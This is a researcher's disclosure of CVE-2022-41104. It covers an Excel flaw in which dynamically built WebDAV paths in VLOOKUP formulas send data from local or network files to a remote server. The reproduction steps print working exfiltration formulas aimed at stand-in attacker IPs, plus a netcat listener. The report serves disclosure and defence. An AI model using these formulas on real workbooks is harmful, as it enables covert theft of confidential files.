# CVE-2022-41104: Microsoft Excel Security Feature Bypass
Below is my original report regarding a security feature bypass in Excel that allowed external WebDAV requests to be made without the user seeing an "Enable content" button. This bypass could have been abused to read and exfiltrate data from arbitrary files.

It has since been fixed, and is being tracked as [CVE-2022-41104](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41104).

## Disclosure Timeline
 - 07/31/2022: Initial report to MSRC via Researcher Portal.
 - 08/08/2022: Report closed as "By Design" as an "Enable Content" button was shown.
 - 08/08/2022: Responded asking for case to be re-opened as the "Enable Content" button was for allowing local file reads, not external WebDAV requests.
 - 08/12/2022: Reached out to an MSRC contact on Twitter for assistance getting the case re-opened.
 - 08/22/2022: MSRC responded stating that the case has been re-opened and the new data was being analyzed.
 - 09/01/2022: MSRC responded stating that they had confirmed the behavior and would determine how to address the issue.
 - 11/02/2022: Requested an update from MSRC and stated intent to disclose.
 - 11/16/2022: MSRC responded stating that the issue had been addressed and tracked as CVE-2022-41104.
 - 11/22/2022: Retested and confirmed that the issue had been fixed.
 - 12/21/2022: Full disclosure.

---

# Excel Arbitrary File Read via WebDAV
Excel supports protocols such as HTTP, SMB, and WebDAV in the `VLOOKUP` function. Excel seems to refuse to execute a call to `VLOOKUP` if the remote URL is dynamically generated when using HTTP or SMB. However, WebDAV is not restricted in the same way. This allows an attacker to read data from potentially sensitive Excel workbooks and many other file types that a victim has access to and then exfiltrate the data via WebDAV requests.

## Details
The `VLOOKUP` function accepts UNC paths and HTTP URLs pointing to remote Excel files. For example, Excel can use these functions to fetch data from a remote workbook:

    =VLOOKUP(A1, 'https://example.com/[data.xlsx]Sheet1'!$A$1:$B$999, 2, TRUE)
    =VLOOKUP(A2, '\\fileserver\finance\[data.xlsx]Sheet1'!$A$1:$B$999, 2, TRUE)

However, when the UNC path or URL is generated by concatenating strings, Excel does not execute the request, such as in these examples:

    =VLOOKUP(A1, INDIRECT(CONCATENATE("'https://example.com/[", "data.xlsx", "]Sheet1'!$A$1:$B$999")), 2, TRUE)
    =VLOOKUP(A1, INDIRECT(CONCATENATE("'\\10.34.122.90\[", "data.xlsx", "]Sheet1'!$A$1:$B$999")), 2, TRUE)

This may be an intentional decision by the Excel team to require remote lookups to use hard-coded URLs and reject dynamically created remote lookups. The `VLOOKUP` function also supports WebDAV URLs, but does not enforce such a restriction. As a result, the following `VLOOKUP` sends a request to a remote server:

    =VLOOKUP(A1, INDIRECT(CONCATENATE("'\\89.122.45.7@80\[", "data.xlsx", "]Sheet1'!$A$1:$B$999")), 2, TRUE)

This function invocation sends a WebDAV request to the server like the following:

    OPTIONS /data.xlsx HTTP/1.1
    Connection: Keep-Alive
    User-Agent: Microsoft-WebDAV-MiniRedir/10.0.22000
    translate: f
    Host: 89.122.45.7:80

This allows an attacker to craft an Excel file which will read data from arbitrary, potentially sensitive files that the victim has access to (such as those on their local system or on a network file share) and then exfiltrate this data by using it as the filename of a remote Excel file via WebDAV requests.

Excel has some quirks that complicate this exfiltration slightly. First, there seems to be a limit on the length of the remote URL, so an attacker must send several WebDAV requests in order to exfiltrate more than a few words from the sensitive file. Second, Excel will not send multiple requests to the same host in a short amount of time. To get around these restrictions, an attacker can listen on multiple ports on a remote server, and send each line of data to a unique port.

The simplest example is reading and exfiltrating data from another Excel workbook. However, in testing it was trivial to create a PowerQuery which would read and exfiltrate data from arbitrary text files. Using PowerQuery allows attackers to read and exfiltrate data from a wide variety of files. Such an attack is demonstrated in `poc-text-file-read.mp4` and the accompanying file `text-file-read.xlsx`.

## Attack Scenario
Suppose Frank is a salesperson who is curious about his coworker's salaries. He knows that there is a file called `salaries.xlsx` on the mapped network drive `k:` pointing to `\\fileshare\finance`. However, he does not have access to this file share and cannot read the `salaries.xlsx` file himself.

Frank can add some `VLOOKUP`s to a report he routinely creates such that when his manager opens the report and refreshes the data, the manager's Excel instance will read data from the `salaries.xlsx` file and then send the data to a remote server that Frank has set up.

Such a scenario is demonstrated in `poc-excel-file-read.mp4`, and the accompanying file `sales-report-july-2022.xlsx`.

## Steps to Reproduce
1. Set up a Linux server, make sure port 80 is open on the external firewall, and bind port 80 to a netcat listener using `nc -l 1.2.3.4 80`, where `1.2.3.4` is the server's local IP address which will be bound to the external public-facing IP address (which we will assume is `4.5.6.7` in the rest of this example).
2. Create a blank Excel file in `C:\Users\<your username>\Documents` called `sensitive.xlsx`.
3. Create an Excel file in `C:\Users\<your username>\Downloads` called `poc.xlsx`.
4. In `poc.xlsx`, set cell `A1` to the formula `='C:\Users\<your username>\Documents\[sensitive.xlsx]Sheet1'!A1:A1`, where `<your username>` is the name of your user profile's home directory.
5. In `poc.xlsx`, set cell `B1` to the formula `=VLOOKUP(A1, INDIRECT(CONCATENATE("'\\4.5.6.7@80\[", A1, "]Sheet1'!A1:A1")), 1, TRUE)` where `4.5.6.7` is the public IP address of your netcat listener.
6. You should see a request in your netcat listener like `OPTIONS /0.xlsx HTTP/1.1` and Excel will lock up. You can use `Ctrl+C` in your Linux terminal to close the connection and Excel will respond again, or simply wait for the connection to time out. Run the netcat listener again to listen for another connection.
7. Save and close `poc.xlsx`.
8. Open `sensitive.xlsx` and set cell `A1` to the string `this is a secret`. Save and close `sensitive.xlsx`.
9. Rename `poc.xlsx` to `poc2.xlsx`.
10. Open `poc2.xlsx` and click `Enable Content` on the warning stating that external links have been disabled.
11. You should see a request in your netcat listener like `OPTIONS /this%20is%20a%20secret.xlsx HTTP/1.1`.

Note that the steps above do not work if HTTP is used instead of WebDAV. For instance, replacing the formula in step 5 with the following will not result in a request being made to the server:

    =VLOOKUP(A1, INDIRECT(CONCATENATE("'http://4.5.6.7/[", A1, "]Sheet1'!A1:A1")), 1, TRUE)

## Impact
- Impact: 5.7 (Medium)
- CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N

The impact of this issue is that an attacker with some knowledge of the location of sensitive files can read data from these files with minimal user interaction on the part of a privileged user. The fact that no macros are needed for this attack and that external references are a commonly used feature of Excel increase the odds that such an attack would succeed, and that it would remain undetected.

## Mitigating Factors
Some factors exist which work to minimize the impact of this vulnerability:

- Some knowledge of the location and names of sensitive files is required on the part of the attacker.
- For Excel files, an attacker must know the names of sheets inside the workbook. It may be possible for an attacker to read these names using a PowerQuery.
- Only datasouces which are supported by Excel can be read, such as other Excel workbooks, Access databases, text files, etc. This minimizes the types of files which can be read. However, most types of files that an attacker would be interested in reading can be opened by Excel in some way.

## Suggested Mitigations
The Excel team should restrict WebDAV URLs in the same way that UNC paths and URLs seem to be restricted, such that attempts to access a dynamically generated WebDAV URLs are ignored.

If not needed for business purposes, security and network administrators should block outbound HTTP and WebDAV requests which include the user-agent `Microsoft-WebDAV-MiniRedir/*`.

Security administrators should consider deploying Windows Defender Application Guard for Office, and configuring it to open all untrusted Office files.